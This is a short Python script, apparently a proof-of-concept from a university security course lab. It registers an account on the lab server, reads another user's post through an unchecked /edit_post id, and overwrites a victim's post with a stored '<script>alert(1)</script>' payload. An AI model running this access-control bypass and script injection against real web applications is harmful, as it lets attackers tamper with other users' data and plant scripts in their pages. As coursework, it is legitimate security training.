import requests as req
import random

def xssvuln2():

    #### LOGIN
    SERVER = "http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt"
    session = req.session()

  #  user = "h4ck3rm3n"
    #password = "h4ck3rm3n"

    user = str(random.randint(2 ** 27, 2 ** 28))
    password = str(random.randint(2 ** 27, 2 ** 28))

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/register', data=params)

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

    print(r.text)
    print(r.headers)

    #### SEND THIS GET REQUEST TO READ A POST WITH ID = id
    id = 1

    params = {'id': id}
    headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
    r = session.get(SERVER + '/edit_post', params = params, headers = headers, cookies = session.cookies)

    assert "No one will find that I have no secrets"  in r.text

    print(r.text)
    print(r.headers)

    #### INJECTING JAVASCRIPT IN THE A POST OF ANOTHER USER WITH ID = id, here we chose id = 25
    id = 25
    payload = "<script>alert(1)</script>"
    type = "Public"
    params = {'content' : payload, 'id' : id, 'type' : type }
    r = session.post(SERVER + '/edit_post', data=params, cookies = session.cookies)

    print(r.text)
    print(r.headers)

    print("attacker username: " + user)
    print("attacker password: " + password)

xssvuln2()
